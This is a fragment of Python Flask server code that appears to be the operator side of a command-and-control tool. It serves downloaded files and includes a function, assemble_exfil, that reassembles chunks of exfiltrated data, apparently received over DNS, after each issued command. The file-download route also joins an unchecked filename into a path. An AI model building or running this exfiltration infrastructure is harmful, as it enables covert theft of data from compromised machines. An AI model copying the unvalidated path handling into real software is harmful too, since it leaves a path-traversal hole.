# --------------------------------- DOWNLOAD --------------------------------- #

@app.route('/download')
def download():
    if not authenticated:
        return redirect(url_for('login'))
    files = os.listdir(DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

@app.route('/download/<filename>')
def download_file(filename):
    if not authenticated:
        return redirect(url_for('login'))
    return send_file(os.path.join(DOWNLOAD_FOLDER, filename), as_attachment=True)

def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
    """
    Wait up to `timeout` seconds for all expected_chunks to arrive,
    polling exfil_buffer every `poll` seconds. Returns the assembled
    text (or empty string on timeout).
    """
    global expected_chunks, exfil_buffer

    start = time.time()
    
    # Wait until we know how many chunks AND have them all, or timeout
    while True:
        if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
        data = b''.join(exfil_buffer[i] for i in range(expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    # Reset the buffer and expected chunks, for next command
    expected_chunks = None
    exfil_buffer.clear()
    return text
